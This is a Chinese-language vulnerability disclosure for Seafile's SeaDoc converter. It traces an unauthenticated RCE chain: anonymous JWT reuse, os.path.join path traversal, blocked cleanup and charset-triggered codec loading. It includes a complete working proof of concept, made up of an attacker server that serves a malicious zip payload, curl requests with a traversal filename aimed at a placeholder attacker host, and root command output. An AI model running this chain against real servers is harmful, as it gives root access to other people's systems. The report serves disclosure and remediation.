# Seafile 漏洞报告

软件名称：Seafile

开发者或厂商：海文（Haiwen）

代码仓库：https://github.com/haiwen/seafile-server

## 1. SeaDoc converter 未授权远程代码执行

简要描述：若攻击者持有公开的 .sdoc 分享链接，则可经由 SeaDoc converter 实现 RCE。

影响版本：SeaDoc 2.0.x ~ 3.x

前置条件：存在公开的 .sdoc 分享链接，或存在公开发布的 wiki。

### 漏洞成因

SeaDoc 由 `seahub`、`sdoc-server`、`seadoc-converter` 三个进程组成，分别负责鉴权与页面渲染、协同编辑、格式转换，三者共用同一个 HMAC 密钥 `JWT_PRIVATE_KEY`。用户打开公开的 `.sdoc` 分享链接时，`seahub` 会在页面中内嵌一个 JWT token，供匿名预览使用。

`seadoc-converter` 中的 `check_auth_token` 函数存在鉴权漏洞，该函数仅校验签名是否合法，既不判断 token 的归属，也不判断 token 所具备的权限。该函数的实现如下：

```python
# seadoc_converter/server/apis.py:25-41    commit 79e46fdcd9
def check_auth_token(req):
    auth = req.headers.get('Authorization', '').split()
    if not auth or auth[0].lower() != 'token' or len(auth) != 2:
        return False

    token = auth[1]
    if not token:
        return False

    private_key = config.SEADOC_PRIVATE_KEY
    try:
        jwt.decode(token, private_key, algorithms=['HS256'])
    except (jwt.ExpiredSignatureError, jwt.InvalidSignatureError) as e:
        logger.exception(e)
        return False

    return True
```

可见，一旦签名校验通过，`check_auth_token` 函数就返回 `True`，故该匿名 token 可获得 converter 全部接口的调用权限，payload 中的 `permission` 字段实际上无效。

converter 提供 `/api/v1/confluence-to-wiki/` 接口。该接口把请求体中的 `filename` 当成路径用于 `os.path.join`，相关代码如下：

```python
# seadoc_converter/server/apis.py:303-325    commit 79e46fdcd9
    underscore_index = filename.rfind('_')
    if underscore_index != -1:
        space_key = filename[underscore_index + 1:-len('.html.zip')]
    elif 'Confluence-space-export-' in filename:
        wiki_name = filename[:-len('.html.zip')]
        space_key = filename[len('Confluence-space-export-'):-len('.html.zip')]
    else:
        wiki_name = filename[:-len('.html.zip')]
        space_key = wiki_name
    try:
        extract_dir = '/tmp/wiki'
        space_dir = os.path.join(extract_dir, space_key)
        zip_file_path = os.path.join(extract_dir, filename)
        if not os.path.exists(extract_dir):
            os.mkdir(extract_dir)
        # Deploy on two machines
        is_same_machine = True
        if not os.path.exists(space_dir):
            os.mkdir(space_dir)
            is_same_machine = False
            response = requests.get(download_url)
            with ZipFile(BytesIO(response.content), 'r') as zip_ref:
                zip_ref.extractall(space_dir)
```

`os.path.join` 有一个特性：第二个参数以斜杠开头时，它会丢弃第一个参数，直接取第二个参数。于是 `space_dir` 就是攻击者指定的绝对路径，压缩包可以解压到任意目录，写入动作由 converter 进程完成，路径与内容全部由攻击者决定。攻击者只要把 `space_key` 设为 `/usr/lib/python3.12/encodings/cp273`，压缩包中的 `__init__.py` 就会落到 `encodings` 包内，成为 `cp273` 子包。

上述文件写入完成之后，本应被 converter 清理，清理语句位于 `finally` 块中。但进入 `finally` 之前还要先上传结果，而这次上传请求没有设置超时。代码如下：

```python
# seadoc_converter/converter/utils.py:221-223    commit 79e46fdcd9
    resp = requests.post(upload_url, files=files)
    if not resp.ok:
        raise Exception(f"upload zip file failed: {resp.text}")
```

清理部分的实现如下：

```python
# seadoc_converter/server/apis.py:335-339    commit 79e46fdcd9
    finally:
        if not is_same_machine:
            shutil.rmtree(space_dir)
        if os.path.exists(zip_file_path):
            os.remove(zip_file_path)
```

若把 `upload_url` 指向一个接受连接却迟迟不响应的地址，`requests.post` 就会一直阻塞，`finally` 不会执行，此前写入的文件因此可以留在磁盘上。

文件留在磁盘上并不会自己执行，还需要触发一次加载。`/api/v1/file-convert/` 接口在上传失败时会把响应体写入日志，相关代码如下：

```python
# seadoc_converter/server/apis.py:103-109    commit 79e46fdcd9
        resp = requests.post(upload_url,
                             data={'target_file': new_file_path, 'parent_dir': parent_dir},
                             files={'file': (file_name, file_content.encode())}
                             )
        if not resp.ok:
            logger.error(resp.text)
            return {'error_msg': resp.text}, 500
```

`requests` 取 `Response.text` 时会调用 `str(self.content, encoding)`，其中 `encoding` 来自响应头的 `charset`。攻击者让上传地址返回 `500`，同时声明 `charset=cp273`，CPython 在解码时就会懒加载 `encodings` 包中对应的 codec。`FileFinder` 查找模块时先看同名目录包 `<name>/__init__.py`，再看同名模块 `<name>.py`，于是它加载的正是此前写入的 `encodings/cp273/__init__.py`，其中的代码就此执行，全程不需要重启服务。

### 复现环境搭建

实验环境用官方 Docker compose 部署，操作如下：

```bash
mkdir seafile && cd seafile
wget https://manual.seafile.com/13.0/repo/docker/ce/env
wget https://manual.seafile.com/13.0/repo/docker/ce/seafile-server.yml
wget https://manual.seafile.com/13.0/repo/docker/ce/caddy.yml
wget https://manual.seafile.com/13.0/repo/docker/ce/seadoc.yml
docker compose up -d
```

环境启动后，创建一个账号，新建 `.sdoc` 文件，生成公开分享链接。

### 复现过程

打开分享链接：

![](img/01-share-link.png)

在页面源码中搜索 `seadocAccessToken`，复制其后的字符串，得到下面这个 JWT：

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJmaWxlX3V1aWQiOiIwODhlZTNlMy1hMTcxLTQ3M2YtYTNkYi01NmJjYjE0OWMwNjUiLCJmaWxlbmFtZSI6Im5vdGUuc2RvYyIsInVzZXJuYW1lIjoiQW5vbnltb3VzIiwibmFtZSI6IkFub255bW91cyIsImF2YXRhcl91cmwiOiJodHRwOi8vc2VhZmlsZS5sb2NhbC9tZWRpYS9hdmF0YXJzL2RlZmF1bHQucG5nIiwicGVybWlzc2lvbiI6InIiLCJkZWZhdWx0X3RpdGxlIjoibm90ZS5zZG9jIiwiZXhwIjoxNzkzMDcyMzU1fQ.X7G6WFnatacDI6Fg9fDT0DmkyYzv5Vgub28spPXOi3g
```

该 JWT 是只读的匿名凭据，解码结果如下：

```
{
    "file_uuid": "088ee3e3-a171-473f-a3db-56bcb149c065",
    "filename": "note.sdoc",
    "username": "Anonymous",
    "name": "Anonymous",
    "avatar_url": "http://seafile.local/media/avatars/default.png",
    "permission": "r",
    "default_title": "note.sdoc",
    "exp": 1793072355
}
```

接下来用这个凭据实施 RCE。converter 会从 `download_url` 下载压缩包，并把处理结果 POST 到 `upload_url`。因此需要在目标服务器可访问的主机上运行一个服务，提供四个端点，其中 `/payload.zip` 返回待写入的压缩包，`/md` 返回供转换的 markdown 文本，`/hang` 接受连接但不作响应，`/err/<codec>` 返回 `500` 并声明指定的 charset，脚本如下：

```python
import asyncio
import io
import zipfile

from fastapi import FastAPI, Response
from fastapi.responses import PlainTextResponse


def build_zip():
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, 'w') as z:
        z.writestr('__init__.py',
                   "import os\n"
                   "if os.fork() == 0:\n"
                   "    os.system('id > /root/pwned; hostname >> /root/pwned')\n"
                   "    os._exit(0)\n")
        z.writestr('page.html',
                   '<html><body><div id="main-content"><h1>Hello</h1>'
                   '<p>world</p></div></body></html>')
    return buf.getvalue()


ZIP = build_zip()
app = FastAPI()


@app.get('/payload.zip')
def payload():
    return Response(ZIP, media_type='application/zip')


@app.get('/md')
def md():
    return PlainTextResponse('# hello\n\nworld\n')


@app.post('/hang')
async def hang():
    await asyncio.sleep(3600)


@app.post('/err/{codec}')
def err(codec: str):
    return Response('boom', status_code=500,
                    media_type='text/plain; charset=%s' % codec)
```

下文以 `192.0.2.10` 表示该主机的地址，端口 `18099` 仅作示例，复现时替换为实际值。启动服务：

```bash
uvicorn attacker_server:app --host 0.0.0.0 --port 18099
```

接下来向 `confluence-to-wiki` 接口发送请求，`filename` 填 `/usr/lib/python3.12/encodings/cp273aaaaaaaaa`，`upload_url` 填 `http://192.0.2.10:18099/hang`。这个请求不会返回，命令如下：

```bash
TOKEN='eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJmaWxlX3V1aWQiOiIwODhlZTNlMy1hMTcxLTQ3M2YtYTNkYi01NmJjYjE0OWMwNjUiLCJmaWxlbmFtZSI6Im5vdGUuc2RvYyIsInVzZXJuYW1lIjoiQW5vbnltb3VzIiwibmFtZSI6IkFub255bW91cyIsImF2YXRhcl91cmwiOiJodHRwOi8vc2VhZmlsZS5sb2NhbC9tZWRpYS9hdmF0YXJzL2RlZmF1bHQucG5nIiwicGVybWlzc2lvbiI6InIiLCJkZWZhdWx0X3RpdGxlIjoibm90ZS5zZG9jIiwiZXhwIjoxNzkzMDcyMzU1fQ.X7G6WFnatacDI6Fg9fDT0DmkyYzv5Vgub28spPXOi3g'
curl -s -X POST http://seafile.local/sdoc-server/converter/api/v1/confluence-to-wiki/ \
  -H "Authorization: token $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"filename":"/usr/lib/python3.12/encodings/cp273aaaaaaaaa","download_url":"http://192.0.2.10:18099/payload.zip","upload_url":"http://192.0.2.10:18099/hang","username":"demo"}'
```

此时，seadoc 容器内可以看到写入成功：

```bash
$ ls -l /usr/lib/python3.12/encodings/cp273/
total 20
-rw-r--r-- 1 root root  104 Oct 24 03:43 __init__.py
drwxr-xr-x 2 root root 4096 Oct 24 03:43 md_output
drwxr-xr-x 2 root root 4096 Oct 24 03:43 __pycache__
-rw-r--r-- 1 root root  563 Oct 24 03:43 sdoc_archive.zip
drwxr-xr-x 2 root root 4096 Oct 24 03:43 sdoc_output
```

然后再向 `file-convert` 接口发送请求，`upload_url` 填 `http://192.0.2.10:18099/err/cp273`，该地址返回 `500` 并声明 `charset=cp273`，命令如下：

```bash
curl -s -X POST http://seafile.local/sdoc-server/converter/api/v1/file-convert/ \
  -H "Authorization: token $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"path":"/x.md","src_type":"markdown","dst_type":"sdoc","username":"demo","doc_uuid":"088ee3e3-a171-473f-a3db-56bcb149c065","download_url":"http://192.0.2.10:18099/md","upload_url":"http://192.0.2.10:18099/err/cp273"}'
```

响应如下：

```
{"error_msg":"boom"}
```

此时，服务器上可以看到命令执行结果：

```bash
$ cat /root/pwned
uid=0(root) gid=0(root) groups=0(root)
508640b9e839
```
